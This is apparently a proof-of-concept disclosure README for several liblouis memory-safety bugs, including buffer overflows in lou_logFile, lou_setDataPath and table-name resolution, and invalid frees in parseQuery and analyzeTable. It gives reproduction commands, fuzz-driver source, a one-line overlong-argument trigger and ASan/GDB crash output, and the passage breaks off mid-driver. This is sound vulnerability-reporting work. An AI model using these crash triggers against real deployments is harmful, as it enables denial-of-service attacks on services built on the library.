# poc-API-6223f21-lou_logFile-BO (CVE-2023-26768)
## Summary
When long filename (larger than 256) is given to API `lou_logFile()`, there will be a global-buffer-overflow.

https://github.com/liblouis/liblouis/blob/517f6f1f35fc5c57ac2f045caa168191bdeaadde/liblouis/logging.c#L123-L130

## Test Environment
Ubuntu 16.04.3 LTS  
liblouis (master, 6223f21)

## How to trigger
1. Compile liblouis with AddressSanitizer
2. Compile the [fuzz driver](https://raw.githubusercontent.com/Marsman1996/pocs/master/liblouis/driver-API-6223f21-lou_logFile-BO.c) and [poc file](https://raw.githubusercontent.com/Marsman1996/pocs/master/liblouis/poc-API-6223f21-lou_logFile-BO)
3. Compile the fuzz driver: `$ clang -g -fsanitize=address,fuzzer ./driver-API-6223f21-lou_logFile-BO.c ./bin_asan/lib/liblouis.a -I ./bin_asan/include/liblouis/ -o driver-API-6223f21-lou_logFile-BO`
4. run the compiled driver: `$ ./driver-API-6223f21-lou_logFile-BO poc-API-6223f21-lou_logFile-BO`

## ASAN report
```
$ ./driver-API-6223f21-lou_logFile-BO poc-API-6223f21-lou_logFile-BO
Minimum size is 0
INFO: Running with entropic power schedule (0xFF, 100).
INFO: Seed: 2700932249
INFO: Loaded 1 modules   (57 inline 8-bit counters): 57 [0x7b0360, 0x7b0399), 
INFO: Loaded 1 PC tables (57 PCs): 57 [0x5705c0,0x570950), 
./driver-API-6223f21-lou_logFile-BO: Running 1 inputs 1 time(s) each.
Running: poc-API-6223f21-lou_logFile-BO
=================================================================
==20412==ERROR: AddressSanitizer: global-buffer-overflow on address 0x00000108b6e0 at pc 0x00000050dbf8 bp 0x7ffe6a0ffac0 sp 0x7ffe6a0ff280
WRITE of size 4098 at 0x00000108b6e0 thread T0
    #0 0x50dbf7 in strcpy /local/mnt/workspace/bcain_clang_vm-bcain-aus_3184/final/llvm-project/compiler-rt/lib/asan/asan_interceptors.cpp:423:5
    #1 0x55492e in lou_logFile /opt/disk/marsman/liblouis/6223f21/build_asan/liblouis/../../code/liblouis/logging.c:130:34
    #2 0x553634 in AFG_func /opt/disk/marsman/liblouis/6223f21/./driver-API-6223f21-lou_logFile-BO.c:17:2
    #3 0x553850 in LLVMFuzzerTestOneInput /opt/disk/marsman/liblouis/6223f21/./driver-API-6223f21-lou_logFile-BO.c:44:2
    #4 0x459911 in fuzzer::Fuzzer::ExecuteCallback(unsigned char const*, unsigned long) /local/mnt/workspace/bcain_clang_vm-bcain-aus_3184/final/llvm-project/compiler-rt/lib/fuzzer/FuzzerLoop.cpp:599:15
    #5 0x4435d2 in fuzzer::RunOneTest(fuzzer::Fuzzer*, char const*, unsigned long) /local/mnt/workspace/bcain_clang_vm-bcain-aus_3184/final/llvm-project/compiler-rt/lib/fuzzer/FuzzerDriver.cpp:323:6
    #6 0x449940 in fuzzer::FuzzerDriver(int*, char***, int (*)(unsigned char const*, unsigned long)) /local/mnt/workspace/bcain_clang_vm-bcain-aus_3184/final/llvm-project/compiler-rt/lib/fuzzer/FuzzerDriver.cpp:856:9
    #7 0x4738c2 in main /local/mnt/workspace/bcain_clang_vm-bcain-aus_3184/final/llvm-project/compiler-rt/lib/fuzzer/FuzzerMain.cpp:20:10
    #8 0x7f8ea559983f in __libc_start_main /build/glibc-S7Ft5T/glibc-2.23/csu/../csu/libc-start.c:291
    #9 0x41e0d8 in _start (/opt/disk/marsman/liblouis/6223f21/driver-API-6223f21-lou_logFile-BO+0x41e0d8)

0x00000108b6e0 is located 0 bytes to the right of global variable 'initialLogFileName' defined in '../../code/liblouis/logging.c:121:13' (0x108b5e0) of size 256
SUMMARY: AddressSanitizer: global-buffer-overflow /local/mnt/workspace/bcain_clang_vm-bcain-aus_3184/final/llvm-project/compiler-rt/lib/asan/asan_interceptors.cpp:423:5 in strcpy
Shadow bytes around the buggy address:
  0x000080209680: 00 00 00 00 00 00 00 00 00 00 00 00 00 00 f9 f9
  0x000080209690: f9 f9 f9 f9 04 f9 f9 f9 f9 f9 f9 f9 00 f9 f9 f9
  0x0000802096a0: f9 f9 f9 f9 04 f9 f9 f9 f9 f9 f9 f9 00 f9 f9 f9
  0x0000802096b0: f9 f9 f9 f9 00 f9 f9 f9 f9 f9 f9 f9 00 00 00 00
  0x0000802096c0: 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00
=>0x0000802096d0: 00 00 00 00 00 00 00 00 00 00 00 00[f9]f9 f9 f9
  0x0000802096e0: f9 f9 f9 f9 00 00 00 00 00 00 00 00 00 00 00 00
  0x0000802096f0: 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00
  0x000080209700: 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00
  0x000080209710: 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00
  0x000080209720: 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00
Shadow byte legend (one shadow byte represents 8 application bytes):
  Addressable:           00
  Partially addressable: 01 02 03 04 05 06 07 
  Heap left redzone:       fa
  Freed heap region:       fd
  Stack left redzone:      f1
  Stack mid redzone:       f2
  Stack right redzone:     f3
  Stack after return:      f5
  Stack use after scope:   f8
  Global redzone:          f9
  Global init order:       f6
  Poisoned by user:        f7
  Container overflow:      fc
  Array cookie:            ac
  Intra object redzone:    bb
  ASan internal:           fe
  Left alloca redzone:     ca
  Right alloca redzone:    cb
  Shadow gap:              cc
==20412==ABORTING
```

# poc-lou_trace-6223f21-resolveSubtable-BO (CVE-2023-26769)
## Summary
When long name table is given to `lou_trace`, there will be a heap-buffer-overflow.

https://github.com/liblouis/liblouis/blob/63722f0428cd4e98d7446658162fb71732d892bb/liblouis/compileTranslationTable.c#L4543-L4565

Because liblouis does not check the length of the input table name, when the table name is longer than `MAXSTRING * sizeof(char) * 2`, there will be a heap-buffer-overflow.

## Test Environment
Ubuntu 16.04.3 LTS
liblouis (master, 6223f21)

## How to trigger
1. Compile the liblouis with AddressSanitizer
2. Run command: `$ ./lou_trace $(python -c "print('a'*4096)")`

## Details

### Asan report
```
$ ./bin_asan/bin/lou_trace $(python -c "print('a'*4096)")
=================================================================
==14488==ERROR: AddressSanitizer: heap-buffer-overflow on address 0x621000002500 at pc 0x000000481e48 bp 0x7ffc8ead9480 sp 0x7ffc8ead8c40
WRITE of size 4097 at 0x621000002500 thread T0
    #0 0x481e47 in strcpy /local/mnt/workspace/bcain_clang_vm-bcain-aus_3184/final/llvm-project/compiler-rt/lib/asan/asan_interceptors.cpp:423:5
    #1 0x4cddca in resolveSubtable /opt/disk/marsman/liblouis/6223f21/build_asan/liblouis/../../code/liblouis/compileTranslationTable.c:4565:2
    #2 0x4cddca in _lou_defaultTableResolver /opt/disk/marsman/liblouis/6223f21/build_asan/liblouis/../../code/liblouis/compileTranslationTable.c:4682:27
    #3 0x4ce442 in _lou_resolveTable /opt/disk/marsman/liblouis/6223f21/build_asan/liblouis/../../code/liblouis/compileTranslationTable.c:4723:22
    #4 0x4d00a5 in compileTable /opt/disk/marsman/liblouis/6223f21/build_asan/liblouis/../../code/liblouis/compileTranslationTable.c:4884:22
    #5 0x4d00a5 in getTable /opt/disk/marsman/liblouis/6223f21/build_asan/liblouis/../../code/liblouis/compileTranslationTable.c:5061:7
    #6 0x4d2742 in _lou_getTable /opt/disk/marsman/liblouis/6223f21/build_asan/liblouis/../../code/liblouis/compileTranslationTable.c:4970:2
    #7 0x4d2742 in lou_getTable /opt/disk/marsman/liblouis/6223f21/build_asan/liblouis/../../code/liblouis/compileTranslationTable.c:4982:2
    #8 0x4c8712 in main /opt/disk/marsman/liblouis/6223f21/build_asan/tools/../../code/tools/lou_trace.c:392:7
    #9 0x7fef5e7bd83f in __libc_start_main /build/glibc-S7Ft5T/glibc-2.23/csu/../csu/libc-start.c:291
    #10 0x41b718 in _start (/opt/disk/marsman/liblouis/6223f21/bin_asan/bin/lou_trace+0x41b718)

0x621000002500 is located 0 bytes to the right of 4096-byte region [0x621000001500,0x621000002500)
allocated by thread T0 here:
    #0 0x49676d in malloc /local/mnt/workspace/bcain_clang_vm-bcain-aus_3184/final/llvm-project/compiler-rt/lib/asan/asan_malloc_linux.cpp:145:3
    #1 0x4cdc27 in resolveSubtable /opt/disk/marsman/liblouis/6223f21/build_asan/liblouis/../../code/liblouis/compileTranslationTable.c:4543:22
    #2 0x4cdc27 in _lou_defaultTableResolver /opt/disk/marsman/liblouis/6223f21/build_asan/liblouis/../../code/liblouis/compileTranslationTable.c:4682:27
    #3 0x4ce442 in _lou_resolveTable /opt/disk/marsman/liblouis/6223f21/build_asan/liblouis/../../code/liblouis/compileTranslationTable.c:4723:22
    #4 0x4d00a5 in compileTable /opt/disk/marsman/liblouis/6223f21/build_asan/liblouis/../../code/liblouis/compileTranslationTable.c:4884:22
    #5 0x4d00a5 in getTable /opt/disk/marsman/liblouis/6223f21/build_asan/liblouis/../../code/liblouis/compileTranslationTable.c:5061:7
    #6 0x4d2742 in _lou_getTable /opt/disk/marsman/liblouis/6223f21/build_asan/liblouis/../../code/liblouis/compileTranslationTable.c:4970:2
    #7 0x4d2742 in lou_getTable /opt/disk/marsman/liblouis/6223f21/build_asan/liblouis/../../code/liblouis/compileTranslationTable.c:4982:2
    #8 0x4c8712 in main /opt/disk/marsman/liblouis/6223f21/build_asan/tools/../../code/tools/lou_trace.c:392:7
    #9 0x7fef5e7bd83f in __libc_start_main /build/glibc-S7Ft5T/glibc-2.23/csu/../csu/libc-start.c:291

SUMMARY: AddressSanitizer: heap-buffer-overflow /local/mnt/workspace/bcain_clang_vm-bcain-aus_3184/final/llvm-project/compiler-rt/lib/asan/asan_interceptors.cpp:423:5 in strcpy
Shadow bytes around the buggy address:
  0x0c427fff8450: 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00
  0x0c427fff8460: 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00
  0x0c427fff8470: 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00
  0x0c427fff8480: 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00
  0x0c427fff8490: 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00
=>0x0c427fff84a0:[fa]fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa
  0x0c427fff84b0: fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa
  0x0c427fff84c0: fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa
  0x0c427fff84d0: fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa
  0x0c427fff84e0: fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa
  0x0c427fff84f0: fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa
Shadow byte legend (one shadow byte represents 8 application bytes):
  Addressable:           00
  Partially addressable: 01 02 03 04 05 06 07 
  Heap left redzone:       fa
  Freed heap region:       fd
  Stack left redzone:      f1
  Stack mid redzone:       f2
  Stack right redzone:     f3
  Stack after return:      f5
  Stack use after scope:   f8
  Global redzone:          f9
  Global init order:       f6
  Poisoned by user:        f7
  Container overflow:      fc
  Array cookie:            ac
  Intra object redzone:    bb
  ASan internal:           fe
  Left alloca redzone:     ca
  Right alloca redzone:    cb
  Shadow gap:              cc
==14488==ABORTING
```

### GDB report
```
*** Error in `/opt/disk/marsman/liblouis/6223f21/bin_normal/bin/lou_trace': double free or corruption (out): 0x000000000064ee30 ***
======= Backtrace: =========
/lib/x86_64-linux-gnu/libc.so.6(+0x777f5)[0x7ffff7a847f5]
/lib/x86_64-linux-gnu/libc.so.6(+0x8038a)[0x7ffff7a8d38a]
/lib/x86_64-linux-gnu/libc.so.6(cfree+0x4c)[0x7ffff7a9158c]
/opt/disk/marsman/liblouis/6223f21/bin_normal/bin/lou_trace[0x426f29]
/opt/disk/marsman/liblouis/6223f21/bin_normal/bin/lou_trace[0x402ea8]
/opt/disk/marsman/liblouis/6223f21/bin_normal/bin/lou_trace[0x402f8e]
/opt/disk/marsman/liblouis/6223f21/bin_normal/bin/lou_trace[0x403842]
/opt/disk/marsman/liblouis/6223f21/bin_normal/bin/lou_trace[0x403ff6]
/opt/disk/marsman/liblouis/6223f21/bin_normal/bin/lou_trace[0x401448]
/lib/x86_64-linux-gnu/libc.so.6(__libc_start_main+0xf0)[0x7ffff7a2d840]
/opt/disk/marsman/liblouis/6223f21/bin_normal/bin/lou_trace[0x401039]
======= Memory map: ========
00400000-00431000 r-xp 00000000 08:11 46443387                           /opt/disk/marsman/liblouis/6223f21/bin_normal/bin/lou_trace
00630000-00631000 r--p 00030000 08:11 46443387                           /opt/disk/marsman/liblouis/6223f21/bin_normal/bin/lou_trace
00631000-00632000 rw-p 00031000 08:11 46443387                           /opt/disk/marsman/liblouis/6223f21/bin_normal/bin/lou_trace
00632000-00669000 rw-p 00000000 00:00 0                                  [heap]
7ffff0000000-7ffff0021000 rw-p 00000000 00:00 0 
7ffff0021000-7ffff4000000 ---p 00000000 00:00 0 
7ffff77f7000-7ffff780d000 r-xp 00000000 08:02 4461034                    /lib/x86_64-linux-gnu/libgcc_s.so.1
7ffff780d000-7ffff7a0c000 ---p 00016000 08:02 4461034                    /lib/x86_64-linux-gnu/libgcc_s.so.1
7ffff7a0c000-7ffff7a0d000 rw-p 00015000 08:02 4461034                    /lib/x86_64-linux-gnu/libgcc_s.so.1
7ffff7a0d000-7ffff7bcd000 r-xp 00000000 08:02 4456715                    /lib/x86_64-linux-gnu/libc-2.23.so
7ffff7bcd000-7ffff7dcd000 ---p 001c0000 08:02 4456715                    /lib/x86_64-linux-gnu/libc-2.23.so
7ffff7dcd000-7ffff7dd1000 r--p 001c0000 08:02 4456715                    /lib/x86_64-linux-gnu/libc-2.23.so
7ffff7dd1000-7ffff7dd3000 rw-p 001c4000 08:02 4456715                    /lib/x86_64-linux-gnu/libc-2.23.so
7ffff7dd3000-7ffff7dd7000 rw-p 00000000 00:00 0 
7ffff7dd7000-7ffff7dfd000 r-xp 00000000 08:02 4456700                    /lib/x86_64-linux-gnu/ld-2.23.so
7ffff7fd1000-7ffff7fd4000 rw-p 00000000 00:00 0 
7ffff7ff6000-7ffff7ff7000 rw-p 00000000 00:00 0 
7ffff7ff7000-7ffff7ffa000 r--p 00000000 00:00 0                          [vvar]
7ffff7ffa000-7ffff7ffc000 r-xp 00000000 00:00 0                          [vdso]
7ffff7ffc000-7ffff7ffd000 r--p 00025000 08:02 4456700                    /lib/x86_64-linux-gnu/ld-2.23.so
7ffff7ffd000-7ffff7ffe000 rw-p 00026000 08:02 4456700                    /lib/x86_64-linux-gnu/ld-2.23.so
7ffff7ffe000-7ffff7fff000 rw-p 00000000 00:00 0 
7ffffffdc000-7ffffffff000 rw-p 00000000 00:00 0                          [stack]
ffffffffff600000-ffffffffff601000 r-xp 00000000 00:00 0                  [vsyscall]

---Type <return> to continue, or q <return> to quit---
Program received signal SIGABRT, Aborted.
0x00007ffff7a42438 in __GI_raise (sig=sig@entry=6) at ../sysdeps/unix/sysv/linux/raise.c:54
54      ../sysdeps/unix/sysv/linux/raise.c: No such file or directory.
(gdb) bt
#0  0x00007ffff7a42438 in __GI_raise (sig=sig@entry=6) at ../sysdeps/unix/sysv/linux/raise.c:54
#1  0x00007ffff7a4403a in __GI_abort () at abort.c:89
#2  0x00007ffff7a847fa in __libc_message (do_abort=do_abort@entry=2, fmt=fmt@entry=0x7ffff7b9dfd8 "*** Error in `%s': %s: 0x%s ***\n") at ../sysdeps/posix/libc_fatal.c:175
#3  0x00007ffff7a8d38a in malloc_printerr (ar_ptr=<optimized out>, ptr=<optimized out>, str=0x7ffff7b9e0e8 "double free or corruption (out)", action=3) at malloc.c:5020
#4  _int_free (av=<optimized out>, p=<optimized out>, have_lock=0) at malloc.c:3874
#5  0x00007ffff7a9158c in __GI___libc_free (mem=<optimized out>) at malloc.c:2975
#6  0x0000000000426f29 in rpl_free (p=0x4ab9, p@entry=0x64ee30) at ../../code/gnulib/free.c:48
#7  0x0000000000402ea8 in resolveSubtable (table=<optimized out>, base=<optimized out>, searchPath=<optimized out>) at ../../code/liblouis/compileTranslationTable.c:4601
#8  _lou_defaultTableResolver (tableList=<optimized out>, base=<optimized out>) at ../../code/liblouis/compileTranslationTable.c:4682
#9  0x0000000000402f8e in _lou_resolveTable (tableList=0x4ab9 <error: Cannot access memory at address 0x4ab9>, tableList@entry=0x7fffffffcfce 'a' <repeats 200 times>..., 
    base=0x4ab9 <error: Cannot access memory at address 0x4ab9>, base@entry=0x0) at ../../code/liblouis/compileTranslationTable.c:4723
#10 0x0000000000403842 in compileTable (tableList=0x7fffffffcfce 'a' <repeats 200 times>..., displayTableList=0x7fffffffcfce 'a' <repeats 200 times>..., translationTable=0x7fffffffb8f8, 
    displayTable=0x7fffffffb908) at ../../code/liblouis/compileTranslationTable.c:4884
#11 getTable (translationTableList=translationTableList@entry=0x7fffffffcfce 'a' <repeats 200 times>..., displayTableList=displayTableList@entry=0x7fffffffcfce 'a' <repeats 200 times>..., 
    translationTable=<optimized out>, translationTable@entry=0x7fffffffc988, displayTable=<optimized out>, displayTable@entry=0x7fffffffc990) at ../../code/liblouis/compileTranslationTable.c:5061
#12 0x0000000000403ff6 in _lou_getTable (tableList=0x4ab9 <error: Cannot access memory at address 0x4ab9>, tableList@entry=0x7fffffffcfce 'a' <repeats 200 times>..., 
    displayTableList=0x4ab9 <error: Cannot access memory at address 0x4ab9>, displayTableList@entry=0x7fffffffcfce 'a' <repeats 200 times>..., translationTable=<optimized out>, 
    displayTable=<optimized out>) at ../../code/liblouis/compileTranslationTable.c:4970
#13 lou_getTable (tableList=0x4ab9 <error: Cannot access memory at address 0x4ab9>, tableList@entry=0x7fffffffcfce 'a' <repeats 200 times>...)
    at ../../code/liblouis/compileTranslationTable.c:4982
#14 0x0000000000401448 in main (argc=<optimized out>, argv=0x7fffffffcc38) at ../../code/tools/lou_trace.c:392
```


# poc-API-6223f21-lou_setDataPath-BO (CVE-2023-26767)

## Summary
When long path (larger than MAXSTRING, i.e., 2048) is given to API `lou_setDataPath()`, there will be a global-buffer-overflow.

Similar to #1291, because liblouis does not check the input length.

https://github.com/liblouis/liblouis/blob/63722f0428cd4e98d7446658162fb71732d892bb/liblouis/compileTranslationTable.c#L58-L62

## Test Environment
Ubuntu 16.04.3 LTS
liblouis (master, 6223f21)

## How to trigger
1. Compile liblouis with AddressSanitizer
2. Compile the [fuzz driver](https://raw.githubusercontent.com/Marsman1996/pocs/master/liblouis/driver-API-6223f21-lou_setDataPath-BO.c) and [poc file](https://raw.githubusercontent.com/Marsman1996/pocs/master/liblouis/poc-API-6223f21-lou_setDataPath-BO)
3. Compile the fuzz driver: `$ clang -g -fsanitize=address,fuzzer ./driver-API-6223f21-lou_setDataPath-BO.c ./bin_asan/lib/liblouis.a -I ./bin_asan/include/liblouis/ -o driver-API-6223f21-lou_setDataPath-BO`
4. run the compiled driver: `$ ./driver-API-6223f21-lou_setDataPath-BO poc-API-6223f21-lou_setDataPath-BO`

## ASAN report
```
$ ./driver-API-6223f21-lou_setDataPath-BO poc-API-6223f21-lou_setDataPath-BO
Minimum size is 0
INFO: Running with entropic power schedule (0xFF, 100).
INFO: Seed: 1537783897
INFO: Loaded 1 modules   (2848 inline 8-bit counters): 2848 [0x80bf40, 0x80ca60), 
INFO: Loaded 1 PC tables (2848 PCs): 2848 [0x5b9668,0x5c4868), 
./driver-API-6223f21-lou_setDataPath-BO: Running 1 inputs 1 time(s) each.
Running: poc-API-6223f21-lou_setDataPath-BO
=================================================================
==29969==ERROR: AddressSanitizer: global-buffer-overflow on address 0x0000010e85a0 at pc 0x00000050dc38 bp 0x7ffed6135f90 sp 0x7ffed6135750
WRITE of size 4098 at 0x0000010e85a0 thread T0
    #0 0x50dc37 in strcpy /local/mnt/workspace/bcain_clang_vm-bcain-aus_3184/final/llvm-project/compiler-rt/lib/asan/asan_interceptors.cpp:423:5
    #1 0x553af6 in lou_setDataPath /opt/disk/marsman/liblouis/6223f21/build_asan/liblouis/../../code/liblouis/compileTranslationTable.c:62:2
    #2 0x553674 in AFG_func /opt/disk/marsman/liblouis/6223f21/./driver-API-6223f21-lou_setDataPath-BO.c:16:2
    #3 0x553890 in LLVMFuzzerTestOneInput /opt/disk/marsman/liblouis/6223f21/./driver-API-6223f21-lou_setDataPath-BO.c:43:2
    #4 0x459951 in fuzzer::Fuzzer::ExecuteCallback(unsigned char const*, unsigned long) /local/mnt/workspace/bcain_clang_vm-bcain-aus_3184/final/llvm-project/compiler-rt/lib/fuzzer/FuzzerLoop.cpp:599:15
    #5 0x443612 in fuzzer::RunOneTest(fuzzer::Fuzzer*, char const*, unsigned long) /local/mnt/workspace/bcain_clang_vm-bcain-aus_3184/final/llvm-project/compiler-rt/lib/fuzzer/FuzzerDriver.cpp:323:6
    #6 0x449980 in fuzzer::FuzzerDriver(int*, char***, int (*)(unsigned char const*, unsigned long)) /local/mnt/workspace/bcain_clang_vm-bcain-aus_3184/final/llvm-project/compiler-rt/lib/fuzzer/FuzzerDriver.cpp:856:9
    #7 0x473902 in main /local/mnt/workspace/bcain_clang_vm-bcain-aus_3184/final/llvm-project/compiler-rt/lib/fuzzer/FuzzerMain.cpp:20:10
    #8 0x7fdb3926383f in __libc_start_main /build/glibc-S7Ft5T/glibc-2.23/csu/../csu/libc-start.c:291
    #9 0x41e118 in _start (/opt/disk/marsman/liblouis/6223f21/driver-API-6223f21-lou_setDataPath-BO+0x41e118)

0x0000010e85a0 is located 0 bytes to the right of global variable 'dataPath' defined in '../../code/liblouis/compileTranslationTable.c:59:14' (0x10e7da0) of size 2048
SUMMARY: AddressSanitizer: global-buffer-overflow /local/mnt/workspace/bcain_clang_vm-bcain-aus_3184/final/llvm-project/compiler-rt/lib/asan/asan_interceptors.cpp:423:5 in strcpy
Shadow bytes around the buggy address:
  0x000080215060: 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00
  0x000080215070: 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00
  0x000080215080: 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00
  0x000080215090: 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00
  0x0000802150a0: 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00
=>0x0000802150b0: 00 00 00 00[f9]f9 f9 f9 f9 f9 f9 f9 f9 f9 f9 f9
  0x0000802150c0: f9 f9 f9 f9 f9 f9 f9 f9 f9 f9 f9 f9 f9 f9 f9 f9
  0x0000802150d0: f9 f9 f9 f9 f9 f9 f9 f9 f9 f9 f9 f9 f9 f9 f9 f9
  0x0000802150e0: f9 f9 f9 f9 f9 f9 f9 f9 f9 f9 f9 f9 f9 f9 f9 f9
  0x0000802150f0: f9 f9 f9 f9 00 f9 f9 f9 f9 f9 f9 f9 04 f9 f9 f9
  0x000080215100: f9 f9 f9 f9 00 00 00 00 00 00 00 00 00 00 00 00
Shadow byte legend (one shadow byte represents 8 application bytes):
  Addressable:           00
  Partially addressable: 01 02 03 04 05 06 07 
  Heap left redzone:       fa
  Freed heap region:       fd
  Stack left redzone:      f1
  Stack mid redzone:       f2
  Stack right redzone:     f3
  Stack after return:      f5
  Stack use after scope:   f8
  Global redzone:          f9
  Global init order:       f6
  Poisoned by user:        f7
  Container overflow:      fc
  Array cookie:            ac
  Intra object redzone:    bb
  ASan internal:           fe
  Left alloca redzone:     ca
  Right alloca redzone:    cb
  Shadow gap:              cc
==29969==ABORTING
```

# poc-API-3d95765-parseQuery-SEGV

Segment fault in `parseQuery()` caused by free a non-malloc()ed string
## Summary
When call API `lou_findTable` with specific file, there will be SEGV in `parseQuery()` at liblouis/metadata.c:586:5

https://github.com/liblouis/liblouis/blob/42af0893e7ac47761ac5ed33c04e43f541f67c46/liblouis/metadata.c#L575-L586

In liblouis/metadata.c:575 there is `if (!v) v = "yes";` and in liblouis/metadata.c:586 liblouis `free(v)`

## Test Environment
Ubuntu 24.04.1, 64bit  
liblouis (master, 3d95765)

## How to trigger
1. Compile liblouis with AddressSanitizer
2. Compile the fuzz driver, the fuzz driver code is:
    ```C
    // This fuzz driver is generated for library liblouis, aiming to fuzz the following functions:
    // lou_setDataPath at compileTranslationTable.c:59:1 in liblouis.h
    // lou_indexTables at metadata.c:895:1 in liblouis.h
    // lou_findTable at metadata.c:1002:1 in liblouis.h
    // lou_getTableInfo at metadata.c:1073:1 in liblouis.h
    #include <stdint.h>
    #include <stddef.h>
    #include <string.h>
    #include <stdlib.h>
    #include <stdio.h>
    #include <liblouis.h>
    #include <stdint.h>
    #include <stdlib.h>
    #include <string.h>

    int LLVMFuzzerTestOneInput(const uint8_t *Data, size_t Size) {
        if (Size < 1) return 0;

        // Set up a dummy data path
        lou_setDataPath("./dummy_file");

        // Call lou_indexTables before lou_findTable
        char *tables[] = {"bin_asan/share/liblouis/tables/afr-za-g1.ctb", NULL};
        lou_indexTables(tables);

        // Use the input data to create a query string
        char *query = (char *)malloc(Size + 1);
        if (!query) return 0;
        memcpy(query, Data, Size);
        query[Size] = '\0';

        // Find a table based on the query
        char *table = lou_findTable(query);
        if (table) {
            // Get table info using a dummy key
            char *info = lou_getTableInfo(table, "dummy_key");
            if (info) {
                free(info); // Use free instead of lou_free for strings
            }
            free(table); // Use free instead of lou_free for strings
        }

        // Clean up
        lou_free(); // Call lou_free without arguments
        free(query);
        return 0;
    }

    int main(int argc, char **argv) {
        if (argc < 2) {
        printf("need file input");
        return -1;
        }
        FILE *file = fopen(argv[1], "rb");
        if (file == NULL) {
            perror("fail to open file");
            return 1;
        }

        fseek(file, 0, SEEK_END);
        size_t Size = ftell(file);
        rewind(file);

        char *Data = (char *)malloc(Size + 1);
        fread(Data, 1, Size, file);
        LLVMFuzzerTestOneInput(Data, Size);
        free(Data);
        fclose(file);
    }
    ```
    The compile command is:
    ```bash
    $ clang ./driver-API-3d95765-parseQuery-SEGV.c -o ./driver-API-3d95765-parseQuery-SEGV -fsanitize=address,undefined -I./bin_asan/include/liblouis ./bin_asan/lib/liblouis.a -lyaml -g
    ```
3. Download the [poc file](https://raw.githubusercontent.com/Marsman1996/pocs/master/liblouis/poc-API-3d95765-parseQuery-SEGV) and run the compiled driver: `$ ./driver-API-3d95765-parseQuery-SEGV poc-API-3d95765-parseQuery-SEGV`

## ASAN report
```
$ ./driver-API-3d95765-parseQuery-SEGV poc-API-3d95765-parseQuery-SEGV 
warning: lou_setDataPath is deprecated.
AddressSanitizer:DEADLYSIGNAL
=================================================================
==743108==ERROR: AddressSanitizer: SEGV on unknown address 0x5fdd76ffe450 (pc 0x5fdd76eb57c6 bp 0x000000000000 sp 0x7ffd758717c0 T0)
==743108==The signal is caused by a WRITE memory access.
    #0 0x5fdd76eb57c6 in __asan::Allocator::Deallocate(void*, unsigned long, unsigned long, __sanitizer::BufferedStackTrace*, __asan::AllocType) (/home/yuwei/afgen/afgenllm/database/liblouis/latest/driver-API-3d95765-parseQuery-SEGV+0x467c6) (BuildId: 84429c59a4ee44f9c90d92673ea84dbbef3f595b)
    #1 0x5fdd76f4dfdf in free (/home/yuwei/afgen/afgenllm/database/liblouis/latest/driver-API-3d95765-parseQuery-SEGV+0xdefdf) (BuildId: 84429c59a4ee44f9c90d92673ea84dbbef3f595b)
    #2 0x5fdd76fce1b2 in parseQuery /home/yuwei/afgen/afgenllm/database/liblouis/latest/build_asan/liblouis/../../code/liblouis/metadata.c:586:5
    #3 0x5fdd76fcd6fb in lou_findTable /home/yuwei/afgen/afgenllm/database/liblouis/latest/build_asan/liblouis/../../code/liblouis/metadata.c:1004:24
    #4 0x5fdd76f8ca45 in LLVMFuzzerTestOneInput /home/yuwei/afgen/afgenllm/database/liblouis/latest/./driver-API-3d95765-parseQuery-SEGV.c:33:19
    #5 0x5fdd76f8cd35 in main /home/yuwei/afgen/afgenllm/database/liblouis/latest/./driver-API-3d95765-parseQuery-SEGV.c:66:5
    #6 0x7febc442a1c9 in __libc_start_call_main csu/../sysdeps/nptl/libc_start_call_main.h:58:16
    #7 0x7febc442a28a in __libc_start_main csu/../csu/libc-start.c:360:3
    #8 0x5fdd76eb33c4 in _start (/home/yuwei/afgen/afgenllm/database/liblouis/latest/driver-API-3d95765-parseQuery-SEGV+0x443c4) (BuildId: 84429c59a4ee44f9c90d92673ea84dbbef3f595b)

AddressSanitizer can not provide additional info.
SUMMARY: AddressSanitizer: SEGV (/home/yuwei/afgen/afgenllm/database/liblouis/latest/driver-API-3d95765-parseQuery-SEGV+0x467c6) (BuildId: 84429c59a4ee44f9c90d92673ea84dbbef3f595b) in __asan::Allocator::Deallocate(void*, unsigned long, unsigned long, __sanitizer::BufferedStackTrace*, __asan::AllocType)
==743108==ABORTING
```

# poc-API-3d95765-analyzeTable-SEGV
Segment fault in `analyzeTable()` caused by free a non-malloc()ed string

## Summary
When call API `lou_indexTables` with specific file, there will be SEGV in `analyzeTable()` at liblouis/metadata.c:842:8

https://github.com/liblouis/liblouis/blob/42af0893e7ac47761ac5ed33c04e43f541f67c46/liblouis/metadata.c#L827-L842

In liblouis/metadata.c:827 there is `if (!v) v = "yes";` and in liblouis/metadata.c:842 liblouis `free(v)`

## Test Environment
Ubuntu 24.04.1, 64bit  
liblouis (master, 3d95765)

## How to trigger
1. Compile liblouis with AddressSanitizer
2. Compile the fuzz driver, the fuzz driver code is:
    ```C
    // This fuzz driver is generated for library liblouis, aiming to fuzz the following functions:
    // lou_indexTables at metadata.c:895:1 in liblouis.h
    #include <stdint.h>
    #include <stddef.h>
    #include <string.h>
    #include <stdlib.h>
    #include <stdio.h>
    #include <liblouis.h>

    int LLVMFuzzerTestOneInput(const uint8_t *Data, size_t Size) {
        if (Size < 1) return 0;

        // Initialize variables
        char *tableList = "./dummy_file";
        FILE *fp = fopen("./dummy_file", "wb");
        fwrite(Data, 1, Size, fp);
        fclose(fp);

        // Call lou_indexTables
